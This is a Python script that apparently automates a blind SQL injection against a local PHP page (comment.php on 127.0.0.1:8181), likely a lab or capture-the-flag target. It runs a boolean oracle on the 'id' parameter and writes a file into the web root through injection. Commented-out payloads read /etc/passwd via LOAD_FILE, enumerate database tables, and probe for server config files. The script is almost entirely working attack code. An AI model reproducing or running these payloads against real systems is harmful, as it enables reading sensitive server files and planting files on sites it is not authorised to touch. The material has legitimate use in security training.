#! /usr/bin/python3

import requests
import sys

from file_writer import FileWriter
from tools import *
from payloads import *
from body_conditions import *
from tester import Tester
from string_finder import StringFinder


def test(payload):
    r = requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload)}, verify=False)
    print('[*] {} => {}'.format(payload, 'admin' not in r.text))
    # print(r.request.url)
    return 'admin' not in r.text


class MyTester(Tester):

    def __init__(self):
        super(MyTester, self).__init__(lambda r: 'admin' in r.text, False)

    def get_request(self, payload):
        return requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'},
                            verify=False)


tester = MyTester()

sf = StringFinder(tester)

# print(sf.read_string("(SELECT {})".format(encode_str('coucou'))))
# print(sf.read_file('/etc/passwd'))

fw = FileWriter(lambda payload: requests.get('http://127.0.0.1:8181/comment.php', params={'log': '1', 'id': '1 {}'.format(payload)}, verify=False), 'FLAG')

fw.write('/var/www/html/upload/flag.txt')

# print(tester.test("AND LENGTH(LOAD_FILE(0x2f6574632f706173737764))>0"))


# print(read_string("(SELECT table_name FROM information_schema.tables ORDER BY table_name LIMIT 1 OFFSET 6)"))

# print(read_string("(SELECT version())"))

# print(test( "AND hex(SUBSTRING(LOAD_FILE({}),{},1))={}".format(encode_str('/etc/passwd'), 1, 72)))

# print(test("UNION ALL SELECT 1 as cmd"))

# read_file('/etc/passwd')

# print(test(file_exists('/etc/passwd')))

# print(test(fl_equal('/etc/passwd', 1386)))

# print(test(file_exists('/usr/share/nginx/www/config.php')))
